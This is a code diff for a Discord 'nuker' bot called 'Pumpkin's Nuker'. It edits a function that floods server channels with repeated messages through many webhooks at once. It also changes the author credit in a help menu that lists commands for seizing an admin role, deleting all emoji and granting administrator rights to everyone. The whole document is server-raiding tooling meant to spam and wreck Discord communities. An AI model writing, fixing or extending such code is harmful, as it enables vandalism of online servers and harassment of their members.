@@ -166,6 +166,8 @@ async def create_webhook_with_delay(channel, name, delay):
     webhook = await channel.create_webhook(name=name)
     return webhook
 
+# Assuming 'webhook_list' is a list of webhook objects.
+
 async def spam(webhook_list):
     try:
         with open('config.json', 'r') as file:
@@ -181,13 +183,9 @@ async def spam(webhook_list):
             async with aiohttp.ClientSession() as session:
                 for _ in range(20):
                     for _ in range(messages_per_channel):
-                        embed = discord.Embed(
-                            title='Spam',
-                            description=message_content
-                        )
                         tasks = []
                         for webhook in webhook_list:
-                            tasks.append(webhook.send(content=message_content, embed=embed))
+                            tasks.append(webhook.send(content=message_content))
 
                         while True:
                             try:
@@ -213,7 +211,6 @@ async def spam(webhook_list):
 
     except Exception as e:
         print("\n", Fore.RED + '[✗]' + Style.RESET_ALL, f'Error in spam command: {e}')
-
 
 async def send_spam(webhook, message_content, embed):
     try:
@@ -326,7 +323,7 @@ async def cmd(ctx):
     embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
     embed.add_field(name='!5', value='deletes all emoji in the server', inline=False)
     embed.add_field(name='!6', value='gives administrator perm to everyone', inline=False)
-    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by Pumpkin\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
+    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by _notpumpkin\nGitHub: https://github.com/kinxyz/Pumpkin", inline=False)
   
     await ctx.author.send(embed=embed)
 
